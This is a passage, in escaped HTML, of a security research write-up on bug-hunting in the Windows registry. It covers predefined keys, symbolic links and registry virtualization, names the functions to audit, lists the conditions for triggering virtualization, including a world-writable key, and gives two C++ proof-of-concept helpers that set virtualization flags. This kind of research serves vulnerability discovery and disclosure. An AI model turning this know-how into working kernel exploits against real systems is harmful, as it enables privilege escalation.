CmEnumerateKey, and so on.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In the following sections, we will take a closer look at each of the possible complications.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.26gy5hkkcrl2&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Predefined keys and symbolic links&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Predefined keys were deprecated in 2023, so I won&amp;#39;t spend much time on them here.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It&amp;#39;s worth mentioning that on modern systems, it wasn&amp;#39;t possible to create them in any way using the API, or even directly using syscalls.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The only way to craft such a key in the registry was to create it in binary form in a controlled hive file and have it loaded via RegLoadAppKey or as a user hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These keys had very strange semantics, both at the key node level (&lt;/span&gt;&lt;span&gt;unusual&lt;/span&gt;&lt;span&gt;&amp;nbsp;encoding of _CM_KEY_NODE.ValueList) and at the kernel key body object level (non-standard value of _CM_KEY_BODY.Type).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Due to the need to filter out these keys at an early stage of syscall execution, there are special helper functions whose purpose is to open the key by handle and verify whether it is or isn&amp;#39;t a predefined handle (CmObReferenceObjectByHandle and CmObReferenceObjectByName).&lt;/span&gt;&lt;span&gt;&amp;nbsp;Consequently, hunting&lt;/span&gt;&lt;span&gt;&amp;nbsp;for bugs related to predefined handles involved verifying whether each syscall used the above wrappers correctly, and whether there was some other way to perform an operation on this type of key while bypassing the type check.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As I have mentioned, this is now just a thing of the past, as predefined handles in input hives are no longer supported and therefore do not pose a security risk to the system.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;When it comes to symbolic links, this is a &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw#REG_OPTION_CREATE_LINK&quot;&gt;semi-documented&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;feature that requires calling the RegCreateKeyEx function with the special REG_OPTION_CREATE_LINK flag to create them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Then, you need to set a value named &amp;quot;SymbolicLinkValue&amp;quot; and of type REG_LINK, which contains the target of the symlink as an absolute, internal registry path (\Registry\...) written using wide characters.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;From that point on, the link points to the specified path.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, it&amp;#39;s important to remember that traversing symbolic links originating from non-system hives is heavily restricted: it can only occur within a single &amp;quot;trust class&amp;quot; (e.g., between the user hive and user classes hive of the same user).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a result, links located in app hives are never fully functional, because each app hive resides in its own isolated trust class, and they cannot reference themselves either, as references to paths starting with &amp;quot;\Registry\A&amp;quot; are blocked by the Windows kernel.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As for&lt;/span&gt;&lt;span&gt;&amp;nbsp;auditing symbolic links, they are generally resolved during the opening/creation of a key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, the analysis mainly involves the CmpParseKey function and lower-level functions called within it, particularly CmpGetSymbolicLinkTarget, which is responsible for reading the target of a given symlink and searching for it in existing registry structures.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Issues &lt;/span&gt;&lt;span&gt;related to symlinks can also be found in registry callbacks registered by third-party drivers, especially those that handle the RegNtPostOpenKey/RegNtPostCreateKey and similar operations. Correctly handling &amp;quot;reparse&amp;quot; return values and the multiple call loops performed by the NT Object Manager is not an easy feat to achieve.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.axtcis3tmawp&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Registry virtualization&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-virtualization&quot;&gt;Registry virtualization&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, introduced in Windows Vista, ensures backward compatibility for older applications that assume administrative privileges when using the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This mechanism redirects references between HKLM\Software and HKU\&amp;lt;SID&amp;gt;_Classes\VirtualStore subkeys transparently, allowing programs to &amp;quot;think&amp;quot; they write to the system hive even though they don&amp;#39;t have sufficient permissions for it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The virtualization logic, integrated into nearly every basic registry syscall, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;is mostly implemented by three functions:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_x1n37nye8y6i-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;CmKeyBodyRemapToVirtualForEnum:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Translates a real key inside a virtualized hive (HKLM\Software&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to a virtual key inside the VirtualStore of the user classes hive during read-type operations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is done to merge the properties of both keys into a single state that is then returned to the caller.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;CmKeyBodyRemapToVirtual:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Translates a real key to its corresponding virtual key, and is used in the key deletion and value deletion operations. This is done to delete the replica of a given key in VirtualStore or one of its values, instead of its real instance in the global hive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;CmKeyBodyReplicateToVirtual:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Replicates the entire key structure that the caller wants to create in the virtualized hive, inside of the VirtualStore.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;All of the above functions have a complicated control flow, both in terms of low-level implementation (e.g., they implement various registry path conversions) and logically &amp;ndash; they create new keys in the registry, merge the states of different keys into one, etc. &lt;/span&gt;&lt;span&gt;As a result, it doesn&amp;#39;t really come as a big surprise that the code has been affected by many vulnerabilities. T&lt;/span&gt;&lt;span&gt;riggering virtualization doesn&amp;#39;t require any special rights, but it does need &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;a few conditions to be met:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_zf75tum0ttlq-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Virtualization must be specifically enabled for a given process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is not the default behavior for 64-bit programs but can be easily enabled by calling the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-settokeninformation&quot;&gt;SetTokenInformation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;function with the TokenVirtualizationEnabled argument on the security token of the process.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Depending on the desired behavior, the appropriate combination of VirtualSource/VirtualTarget/VirtualStore flags should be set in _CM_KEY_NODE.Flags.&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;his can be achieved either through binary control over the hive or by setting it at runtime using the NtSetInformationKey call with the KeySetVirtualizationInformation argument.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;The REG_KEY_DONT_VIRTUALIZE flag must not be set in the _CM_KEY_NODE.VirtControlFlags field for a given key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is usually not an issue, but if necessary, it can be adjusted either in the binary representation of the hive or using the NtSetInformationKey call with the KeyControlFlagsInformation argument.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;In specific cases, the source key must be located in a virtualizable hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In such scenarios, the HKLM\Software\Microsoft\DRM key becomes very useful, as it meets this condition and has a permissive security descriptor that allows all users in the system to create subkeys within it.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;With regards to the first two points&lt;/span&gt;&lt;span&gt;, many examples of virtualization-related bugs can be found in the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues?q=customfield1352808:Microsoft%20customfield1352754:mjurczyk%20created%3E2022-05-01%20created%3C2024-12-31%20virtualization&quot;&gt;Project Zero bug tracker&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These reports include proof-of-concept code that correctly sets the appropriate flags.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For simplicity, I will share that code here as well; the two C++ functions responsible for enabling virtualization for a given security token and registry key are shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;EnableTokenVirtualization(HANDLE&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;hToken,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;bEnabled)&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;dwVirtualizationEnabled&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;bEnabled;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp;SetTokenInformation(hToken,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;TokenVirtualizationEnabled,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;amp;dwVirtualizationEnabled,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;(dwVirtualizationEnabled));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;EnableKeyVirtualization(HKEY&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;hKey,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtualTarget,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtualStore,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtualSource)&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;KEY_SET_VIRTUALIZATION_INFORMATION&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtInfo;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtInfo.VirtualTarget&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtualTarget;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtInfo.VirtualStore&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtualStore;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtInfo.VirtualSource&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtualSource;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;VirtInfo.Reserved&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;Status&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NtSetInformationKey(hKey,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;KeySetVirtualizationInformation,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;amp;VirtInfo,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;(VirtInfo));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NT_SUCCESS(Status);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
